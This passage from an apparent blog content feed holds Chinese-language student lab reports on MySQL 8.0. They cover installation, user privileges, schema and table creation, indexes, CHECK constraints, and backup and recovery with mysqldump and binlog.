class="operator">/</span>A、C两厂家的电脑价格都在<span class="number">5000</span>元以下</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure>
<p>试图进行插入操作。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/ref_6_0.png" class="">
<p>这些值均插入成功，MySQL 表格定义的 CHECK 字句没能起作用！</p>
 <img data-src="/2018/12/03/experiments/database/data-control/ref_6_1.png" class="">
</li>
<li>
<p>(<code>CONSTRAINT</code> 短语) 临时表 Computers 重新定义如下</p>
 <img data-src="/2018/12/03/experiments/database/data-control/ref_7_0.png" class="">
<p>代码无法通过编译，应该是 MySQL 的语法与 SQL 语言标准不同的原因导致不能完全按课本示例来创建。</p>
</li>
</ol>
</li>
</ol>
<h3 id="数据的备份与恢复">数据的备份与恢复</h3>
<div class="note warning"><p>请检查 binlog 是否开启，开启方法见本文<a href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">最后</a>。<br>
<img data-src="/2018/12/03/experiments/database/data-control/backup_0.png" class=""></p>
</div>
<ol>
<li>
<p>创建备份设备，本例利用 <code>mysqldump</code> 命令将 computer_products 数据库放在了 E 盘根目录中。此操作需要输入密码。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u <span class="number">2017522133</span> <span class="operator">-</span>p computer_products<span class="operator">&gt;</span>E:\computer_products.sql</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/backup_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/backup_2.png" class=""></div></div></div>
 <div class="note info"><p>这个 SQL 文件可以用 MySQL 图形界面打开，内容大概如下。<br>
<img data-src="/2018/12/03/experiments/database/data-control/backup_3.png" class="" title="实际上就是重建表格的过程"></p>
</div>
</li>
<li>
<p>对表格做插入操作。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_4.png" class="">
</li>
<li>
<p>先执行 <code>show master status</code>，然后执行 <code>flush logs</code>，将 <code>master status</code> 显示的文件复制到其他地方。执行 <code>flush logs</code> 意义在于切换为新的日志文件，将问题段集中在一个日志文件中。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_5.png" class="">
 <img data-src="/2018/12/03/experiments/database/data-control/backup_6.png" class="">
<p>binlog.000011 文件内容如下，可以看到，从 pos=4 到 pos=795 经历了两次 commit 操作，分别为两条数据的新建操作，经分析，若要恢复数据新建的状态，只需恢复这个 log 即可。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_7.png" class="">
</li>
<li>
<p>执行 <code>source E:/computer_products.sql</code>。经过一段操作后，登录数据库，查看表格。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_8.png" class="">
<p>下图表明数据库成功恢复到了数据插入前的状态。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_9(4.5).png" class="">
</li>
<li>
<p>接下来使用 <code>mysqlbinlog</code> 命令恢复插入两条数据后的状态，此命令需要在 Windows cmd 命令行下进行。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysqlbinlog E:<span class="operator">/</span>back_binlog<span class="number">.000011</span> <span class="operator">|</span> mysql <span class="operator">-</span>u <span class="operator">&lt;</span>我的用户名<span class="operator">&gt;</span> <span class="operator">-</span>p <span class="operator">&lt;</span>我的密码<span class="operator">&gt;</span> <span class="comment">--database=computer_products</span></span><br></pre></td></tr></tbody></table></figure>
<p>根据提示输入管理员密码。</p>
 <img data-src="/2018/12/03/experiments/database/data-control/backup_10.png" class="">
</li>
<li>
<p>登录数据库查看表格情况。下图显示表明，数据库已恢复至插入数据后的状态。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/backup_11.png" class=""></div><div class="group-picture-column"><img data-src="/2018/12/03/experiments/database/data-control/backup_12.png" class=""></div></div></div>
</li>
</ol>
<h2 id="遇到的问题和解决方法">遇到的问题和解决方法</h2>
<ol>
<li>
<p>授权出错，显示 <code>You are not allowed to create a user with GRANT</code>。</p>
<p>原因：在网上有很多教程说当出现 <code>The user specified as a definer ('root'@'%') does not exist</code> 时表示 <code>root</code> 用户权限不足，只需要执行 <code>GRANT ALL ON *.* TO 'root'@'%';</code> 就可以了，但是往往又会出现 <code>You are not allowed to create a user with GRANT</code> 的错误提示。这是因为 <code>GRANT ALL ON *.* TO 'root'@'%';</code> 这条语句中 <code>@'%'</code> 中的百分号其实是 root 用户对应 host 的名称，很多人并没有注意到他的 root 用户对应的其实是 localhost，直接就执行了上面的语句，所以才会报错。</p>
<p>解决方案：只要将 <code>GRANT ALL ON *.* TO 'root'@'%';</code> 中的 <code>%</code> 改为对应的 <code>host</code> 名称即可，最后还要刷新一下权限 <code>FLUSH PRIVILEGES;</code>。</p>
</li>
<li>
<p>MySQL 中的角色（Roles）概念？不是没有角色吗？</p>
<p>在 MySQL8.0 版本后，有了 Roles 概念的引入。MySQL 的官方文本对此作了介绍。其中明确提出 ——</p>
 <blockquote><ol>
<li>可以用 <code>CREATE ROLE</code> 命令建立角色；</li>
<li>可以用 <code>GRANT</code> 命令授予这些角色以权限；</li>
<li>可以用 <code>SHOW GRANTS FOR</code> 命令检查某用户拥有的权限；</li>
<li>可以用 <code>REVOKE</code> 命令收回用户的权限；</li>
<li>可以用 <code>DROP ROLE</code> 命令删除角色。</li>
</ol>
<footer><strong>MySQL Dev Doc</strong><cite><a href="https://dev.mysql.com/doc/refman/8.0/en/roles.html#roles-creating-granting">dev.mysql.com/doc/refman/8.0/en/roles.html#roles-creating-granting</a></cite></footer></blockquote>
</li>
<li>
<p>MySQL 开启 binlog 的方法。</p>
<ul>
<li>打开 MySQL 配置文件 <code>my.cnf</code>，在 [mysqld] 下面增加 <code>log-bin=mysql-bin</code>（UNIX）</li>
<li>修改 MySQL 配置文件 <code>my.ini</code> ，添加配置：<code>log-bin=log-bin=&lt;日志存储实际路径&gt;</code>（WIndows）</li>
<li>把前面的<code>#</code>去掉。</li>
</ul>
</li>
<li>
<p>MySQL 中备份与恢复命令语法</p>
<ul>
<li>
<p><code>mysqldump</code>：用于做数据库的全量备份。<br>
格式：<code>mysqldump -h主机名  -P端口 -u用户名 -p密码 –database 数据库名 &gt; 文件名.sql</code></p>
</li>
<li>
<p><code>source</code>：用于从全量备份中恢复。<br>
用 use 进入到某个数据库，<code>mysql&gt;source d:\test.sql</code>（刚备份的文件）</p>
</li>
<li>
<p><code>mysqlbinlog</code>：用于查看 binlog 以及从日志文件恢复。</p>
</li>
<li>
<p>查看日志：</p>
<ol>
<li>
<p>查看所有 binlog 日志列表</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> master logs;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>查看 master 状态，即最后 (最新) 一个 binlog 日志的编号名称，及其最后一个操作事件 pos 结束点 (Position) 值</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> master status;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>刷新 log 日志，自此刻开始产生一个新编号的 binlog 日志文件</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> flush logs;</span><br></pre></td></tr></tbody></table></figure>
<div class="note warning"><p>每当 mysqld 服务重启时，会自动执行此命令，刷新 binlog 日志；在 <code>mysqldump</code> 备份数据时加 <code>-F</code> 选项也会刷新 binlog 日志。</p>
</div>
</li>
<li>
<p>重置 (清空) 所有 binlog 日志</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> reset master;</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>从日志中恢复：</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">mysqlbinlog mysql<span class="operator">-</span>bin<span class="number">.0000</span>xx <span class="operator">|</span> mysql <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 数据库名</span><br></pre></td></tr></tbody></table></figure>
 <div class="tabs" id="mysqlbinlog-option"><ul class="nav-tabs"><li class="tab active"><a href="#mysqlbinlog-option-1">常用选项</a></li><li class="tab"><a href="#mysqlbinlog-option-2">不常用选项</a></li></ul><div class="tab-content"><div class="tab-pane active" id="mysqlbinlog-option-1"><pre><code>  <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">--start-position=953                   起始pos点</span><br><span class="line">--stop-position=1437                   结束pos点</span><br><span class="line">--start-datetime="start_date" 起始时间点</span><br><span class="line">--stop-datetime="stop_date"  结束时间点</span><br><span class="line">--database=x                   指定只恢复x数据库(一台主机上往往有多个数据库，只限本地log日志)</span><br></pre></td></tr></tbody></table></figure>
</code></pre></div><div class="tab-pane" id="mysqlbinlog-option-2"><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   -u --user=name              Connect to the remote server as username.连接到远程主机的用户名</span><br><span class="line">-p --password[=name]        Password to connect to remote server.连接到远程主机的密码</span><br><span class="line">-h --host=name              Get the binlog from server.从远程主机上获取binlog日志</span><br><span class="line">--read-from-remote-server   Read binary logs from a MySQL server.从某个MySQL服务器上读取binlog日志</span><br></pre></td></tr></tbody></table></figure></div></div></div>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="资料来源">资料来源</h2>
<ul>
<li><a href="https://blog.csdn.net/nuli888/article/details/52117646">https://blog.csdn.net/nuli888/article/details/52117646</a></li>
<li><a href="https://www.cnblogs.com/Cherie/p/3309456.html">https://www.cnblogs.com/Cherie/p/3309456.html</a></li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>认识 DBMS</title>
    <url>/2018/11/08/experiments/database/hello-dbms/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>通过安装和简单使用 MySQL，熟悉数据库管理软件的基本使用方法。</p>
<span id="more"></span>
<h2 id="实验环境">实验环境</h2>
<img data-src="/2018/11/08/experiments/database/hello-dbms/%E7%8E%AF%E5%A2%83.png" class="">
<p>本次实验使用 MySQL Community 8.0.12.0 版。操作系统如上图所示。</p>
<h2 id="实验内容与完成情况">实验内容与完成情况</h2>
<h3 id="安装">安装</h3>
<ol>
<li>安装界面如图所示 <img data-src="/2018/11/08/experiments/database/hello-dbms/1.png" class="">
</li>
<li>选择安装类型，这里选择 Developer Default 套装，根据描述，将装入以下套件：
<ul>
<li>MySQL Server</li>
<li>MySQL Shell</li>
<li>MySQL Router</li>
<li>MySQL Workbench</li>
<li>MySQL for Excel</li>
<li>MySQL for Visual Studio</li>
<li>MySQL Connectors</li>
<li>Examples and tutorials</li>
<li>Documentation<img data-src="/2018/11/08/experiments/database/hello-dbms/2.png" class="">
</li>
</ul>
</li>
<li>配置认证方式和密码强度，保持默认选项 <img data-src="/2018/11/08/experiments/database/hello-dbms/3.png" class="">
</li>
<li>配置 root 账户密码，<em>一定要记住</em>。 <img data-src="/2018/11/08/experiments/database/hello-dbms/5.png" class="">
这里也可以配置 DB 账户并赋予相应权限，如下图 <img data-src="/2018/11/08/experiments/database/hello-dbms/4.png" class="">
</li>
<li>在配置服务时，最好勾选上这两项，这样开机时就不需要再手动启动 MySQL 服务。后面的安装过程就没有什么要说的了。 <img data-src="/2018/11/08/experiments/database/hello-dbms/6.png" class="">
</li>
</ol>
<h3 id="创建用户，赋予权限">创建用户，赋予权限</h3>
<img data-src="/2018/11/08/experiments/database/hello-dbms/7.png" class="">
<ol>
<li>启动 MySQL Workbench 软件，主界面如上图。</li>
<li>在主界面点击 Local instance MySQL80 登录到 Server 上。登录后界面如下图。 <img data-src="/2018/11/08/experiments/database/hello-dbms/8.png" class="">
</li>
<li>在 Management 栏中，选择 Users and Privileges。然后点击 Add Account。 <div class="note info"><p>名为 2017522133 的账户刚才已经在安装过程中创建了</p>
</div>
 <img data-src="/2018/11/08/experiments/database/hello-dbms/user_conf_1.png" class="">
</li>
<li>在 Administrative Roles 中，勾选 DBA，发现后面几项同样被勾选。然后点击 Apply。 <img data-src="/2018/11/08/experiments/database/hello-dbms/user_conf_2.png" class="" title="现在这个账户就具有了DBA权限">
</li>
</ol>
<h3 id="服务的启动与终止">服务的启动与终止</h3>
<ol>
<li>单击左侧 Instance 栏中的 Startup/Shutdown，会见到如下界面。现在数据库服务是停止状态。 <img data-src="/2018/11/08/experiments/database/hello-dbms/server_stopped.png" class="">
</li>
<li>点击 Start Server，现在数据库服务是运行状态。 <img data-src="/2018/11/08/experiments/database/hello-dbms/server_running.png" class="">
</li>
<li>在数据库服务运行的同时，可以点击 Bring Offline，在不停止服务的情况下让数据库离线运行。 <img data-src="/2018/11/08/experiments/database/hello-dbms/server_offline.png" class="">
</li>
</ol>
<h3 id="创建数据库和表">创建数据库和表</h3>
<ol>
<li>点击菜单中的 File，选择 New Model，进入如下界面，再点击 Add Table 开始添加表格。 <img data-src="/2018/11/08/experiments/database/hello-dbms/9.png" class="">
</li>
<li>Columns 栏用于定义列名称和数据类型，主码和 Not Null 要求也将在这里指定。 <img data-src="/2018/11/08/experiments/database/hello-dbms/10.png" class="">
 <div class="note info"><p>特别地，若勾选 Primary Key，则 Not Null 也被同时勾选。符合主码非空的原则。</p>
</div>
</li>
<li>Foreign Keys 用于设置外键，可以置入参照，例如例子中的 Course 表和 SC 表。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/11.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/12.png" class=""></div></div></div>
</li>
<li>在 Inserts 中为表格添加内容，以下是建好的表格内容。 <div class="tabs" id="table-and-schemas"><ul class="nav-tabs"><li class="tab active"><a href="#table-and-schemas-1">Course 表</a></li><li class="tab"><a href="#table-and-schemas-2">Student 表</a></li><li class="tab"><a href="#table-and-schemas-3">选课关系 ——SC 表</a></li></ul><div class="tab-content"><div class="tab-pane active" id="table-and-schemas-1"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/Course-schema.png" class="" title="Course表结构"></div><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/Course-data.png" class="" title="Course表数据"></div></div></div></div><div class="tab-pane" id="table-and-schemas-2"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/Student-schema.png" class="" title="Student表结构"></div><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/Student-data.png" class="" title="Student表数据"></div></div></div></div><div class="tab-pane" id="table-and-schemas-3"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/SC-schema.png" class="" title="SC表结构"></div><div class="group-picture-column"><img data-src="/2018/11/08/experiments/database/hello-dbms/SC-data.png" class="" title="SC表数据"></div></div></div></div></div></div>
</li>
</ol>
<h2 id="实验总结">实验总结</h2>
<p>通过本次实验，我了解到了 MySQL 中的一些基本操作，包括安装、启动 / 停止服务、创建基本表等操作，并创建了一个简单的学生选课表。在之后的实验中，将使用 SQL 语句进行表格查询的工作。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>交互式 SQL</title>
    <url>/2018/11/17/experiments/database/interactive-sql/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>通过进行给定使用场景下的 SQL 语句编写和运行，理解 SQL 语句的执行过程。</p>
<span id="more"></span>
<h2 id="实验环境">实验环境</h2>
<ul>
<li>本次实验使用 MySQL Community 8.0.12.0 版。</li>
<li>本次实验使用了 MySQL Workbench 工具。</li>
<li>操作系统同 <a href="/2018/11/08/experiments/database/hello-dbms/" title="认识DBMS">实验一</a>。</li>
</ul>
<h2 id="实验内容和完成情况">实验内容和完成情况</h2>
<h3 id="本次使用的数据库内容">本次使用的数据库内容</h3>
<div class="tabs" id="tables"><ul class="nav-tabs"><li class="tab active"><a href="#tables-1">Product</a></li><li class="tab"><a href="#tables-2">PC</a></li><li class="tab"><a href="#tables-3">Laptop</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tables-1"><table>
<thead>
<tr>
<th style="text-align:left">maker</th>
<th style="text-align:left">model</th>
<th style="text-align:left">type</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:left">1001</td>
<td style="text-align:left">pc</td>
</tr>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:left">1002</td>
<td style="text-align:left">pc</td>
</tr>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:left">2004</td>
<td style="text-align:left">laptop</td>
</tr>
<tr>
<td style="text-align:left">B</td>
<td style="text-align:left">1003</td>
<td style="text-align:left">pc</td>
</tr>
<tr>
<td style="text-align:left">B</td>
<td style="text-align:left">1004</td>
<td style="text-align:left">pc</td>
</tr>
<tr>
<td style="text-align:left">B</td>
<td style="text-align:left">2005</td>
<td style="text-align:left">laptop</td>
</tr>
<tr>
<td style="text-align:left">C</td>
<td style="text-align:left">1005</td>
<td style="text-align:left">pc</td>
</tr>
<tr>
<td style="text-align:left">C</td>
<td style="text-align:left">2006</td>
<td style="text-align:left">laptop</td>
</tr>
<tr>
<td style="text-align:left">C</td>
<td style="text-align:left">2007</td>
<td style="text-align:left">laptop</td>
</tr>
</tbody>
</table></div><div class="tab-pane" id="tables-2"><table>
<thead>
<tr>
<th style="text-align:left">model</th>
<th style="text-align:left">speed</th>
<th style="text-align:left">ram</th>
<th style="text-align:left">hd</th>
<th style="text-align:left">price</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1001</td>
<td style="text-align:left">2.66</td>
<td style="text-align:left">1024</td>
<td style="text-align:left">250</td>
<td style="text-align:left">2114</td>
</tr>
<tr>
<td style="text-align:left">1002</td>
<td style="text-align:left">2.10</td>
<td style="text-align:left">512</td>
<td style="text-align:left">250</td>
<td style="text-align:left">995</td>
</tr>
<tr>
<td style="text-align:left">1003</td>
<td style="text-align:left">1.42</td>
<td style="text-align:left">512</td>
<td style="text-align:left">80</td>
<td style="text-align:left">478</td>
</tr>
<tr>
<td style="text-align:left">1004</td>
<td style="text-align:left">2.80</td>
<td style="text-align:left">1024</td>
<td style="text-align:left">250</td>
<td style="text-align:left">649</td>
</tr>
<tr>
<td style="text-align:left">1005</td>
<td style="text-align:left">3.15</td>
<td style="text-align:left">2048</td>
<td style="text-align:left">500</td>
<td style="text-align:left">4028</td>
</tr>
</tbody>
</table></div><div class="tab-pane" id="tables-3"><table>
<thead>
<tr>
<th style="text-align:left">model</th>
<th style="text-align:left">speed</th>
<th style="text-align:left">ram</th>
<th style="text-align:left">hd</th>
<th style="text-align:left">screen</th>
<th style="text-align:left">price</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">2004</td>
<td style="text-align:left">2.00</td>
<td style="text-align:left">512</td>
<td style="text-align:left">60</td>
<td style="text-align:left">13.3</td>
<td style="text-align:left">1150</td>
</tr>
<tr>
<td style="text-align:left">2005</td>
<td style="text-align:left">2.16</td>
<td style="text-align:left">1024</td>
<td style="text-align:left">120</td>
<td style="text-align:left">17.0</td>
<td style="text-align:left">2500</td>
</tr>
<tr>
<td style="text-align:left">2006</td>
<td style="text-align:left">5.00</td>
<td style="text-align:left">4096</td>
<td style="text-align:left">500</td>
<td style="text-align:left">17.0</td>
<td style="text-align:left">6094</td>
</tr>
<tr>
<td style="text-align:left">2007</td>
<td style="text-align:left">3.58</td>
<td style="text-align:left">4028</td>
<td style="text-align:left">120</td>
<td style="text-align:left">14.5</td>
<td style="text-align:left">4000</td>
</tr>
</tbody>
</table></div></div></div>
<h3 id="数据定义">数据定义</h3>
<h4 id="模式的创建与删除">模式的创建与删除</h4>
<ol>
<li>
<p>为当前用户创建一个名为 <code>computer_products</code> 的模式。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SCHEMA `computer_products`;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_schema_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_schema_2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_schema_3.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_schema_4%E6%88%96%E5%8F%8C%E5%87%BB%E5%B7%A6%E4%BE%A7%E5%88%97%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%90%8D.png" class=""></div></div></div>
 <div class="note info"><ol>
<li>MySQL 创建模式时不需要 <code>AUTHORIZATION</code> 子句。</li>
<li>创建完模式后，需要双击 <code>computer_products</code> 或使用 <code>use computer_products;</code> 命令进入该模式。</li>
<li>应当进行已有数据库的检查，若已存在，则先删除再插入。其实采用以下语句会更加科学。</li>
</ol>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> SCHEMA IF <span class="keyword">EXISTS</span> `computer_products`;</span><br><span class="line"><span class="keyword">CREATE</span> SCHEMA IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `computer_products`;</span><br></pre></td></tr></tbody></table></figure>
</div>
</li>
<li>
<p>本次实验已结束，本模式不再需要。请删除 <code>computer_products</code> 模式。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> SCHEMA computer_products;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_schema_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_schema_2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_schema_3.png" class=""></div></div></div>
<p>执行成功后，SCHEMAS 栏中不再有此模式（见最右图）。</p>
</li>
</ol>
<h4 id="基本表的创建与删除">基本表的创建与删除</h4>
<ol>
<li>
<p>创建计算机产品数据库的 Product 表、PC 表和 Laptop 表。</p>
 <div class="tabs" id="table-ddl"><ul class="nav-tabs"><li class="tab active"><a href="#table-ddl-1">Product</a></li><li class="tab"><a href="#table-ddl-2">PC</a></li><li class="tab"><a href="#table-ddl-3">Laptop</a></li></ul><div class="tab-content"><div class="tab-pane active" id="table-ddl-1"><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Product(</span><br><span class="line">   maker <span class="type">char</span>(<span class="number">2</span>), </span><br><span class="line">   model <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">primary</span> key,</span><br><span class="line">   type <span class="type">char</span>(<span class="number">10</span>)</span><br><span class="line">   );</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="table-ddl-2"><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">create</span> <span class="keyword">table</span> PC(</span><br><span class="line">  model <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">primary</span> key,</span><br><span class="line">  speed <span class="type">float</span>(<span class="number">3</span>),</span><br><span class="line">  ram <span class="type">int</span>(<span class="number">5</span>),</span><br><span class="line">  hd <span class="type">int</span>(<span class="number">4</span>),</span><br><span class="line">  price <span class="type">int</span>(<span class="number">5</span>),</span><br><span class="line">  <span class="keyword">foreign</span> key (model) <span class="keyword">references</span> Product(model)</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="table-ddl-3"><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">create</span> <span class="keyword">table</span> Laptop(</span><br><span class="line">  model <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">primary</span> key,</span><br><span class="line">  speed <span class="type">float</span>(<span class="number">3</span>),</span><br><span class="line">  ram <span class="type">int</span>(<span class="number">5</span>),</span><br><span class="line">  hd <span class="type">int</span>(<span class="number">4</span>),</span><br><span class="line">  screen <span class="type">float</span>(<span class="number">2</span>),</span><br><span class="line">  price <span class="type">int</span>(<span class="number">5</span>),</span><br><span class="line">  <span class="keyword">foreign</span> key (model) <span class="keyword">references</span> Product(model)</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure></div></div></div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table1_select.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table2_select.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table3.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_table3_select.png" class=""></div></div></div>
 <img data-src="/2018/11/17/experiments/database/interactive-sql/create_table_result.png" class="" title="创建结果">
 <div class="note info"><ol>
<li>MySQL 中引用外码的写法是 <code>FOREIGN KEY (&lt;外码列名&gt;) REFERENCES &lt;表名&gt;(&lt;引用列名&gt;)</code>。</li>
<li>后来，我将 screen 和 speed 的数据类型改为了 <code>decimal</code>（MySQL 中不支持 numeric 的写法），在后面的数据查找操作中会简单讲下为什么要这样做。</li>
</ol>
</div>
</li>
<li>
<p>为 PC 表中加入屏幕尺寸列，取值为一位小数。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> pc <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> screen <span class="type">FLOAT</span>(<span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/alter_table_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/alter_table_2.png" class=""></div></div></div>
</li>
<li>
<p>为统计屏幕尺寸创建了一个新表 screen，现在统计结束，不再需要此表。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> screen;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_table_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_table_2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_table_3.png" class=""></div></div></div>
</li>
</ol>
<h4 id="索引的建立与删除">索引的建立与删除</h4>
<ol>
<li>
<p>按照降序序列建立 PC 表中价格的索引。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX pc_price <span class="keyword">ON</span> pc(price <span class="keyword">DESC</span>);</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_index_0.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_index_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/create_index_2.png" class=""></div></div></div>
</li>
<li>
<p>1 中的索引不再需要，请删除 <code>pc_price</code> 索引。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX pc_price <span class="keyword">ON</span> pc;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_index_1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/drop_index_2.png" class=""></div></div></div>
 <div class="note info"><p>在 MySQL 中，<code>drop index</code> 语句中也有 <code>on</code> 子句，需要指定索引所在表。</p>
</div>
</li>
</ol>
<h3 id="数据操作">数据操作</h3>
<h4 id="数据更新">数据更新</h4>
<ol>
<li>
<p>向计算机产品数据库中添加给定数据。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table1.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table1_select.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table2.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table2_select.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table3.png" class=""></div><div class="group-picture-column"><img data-src="/2018/11/17/experiments/database/interactive-sql/insert_into_table3_select.png" class=""></div></div></div>
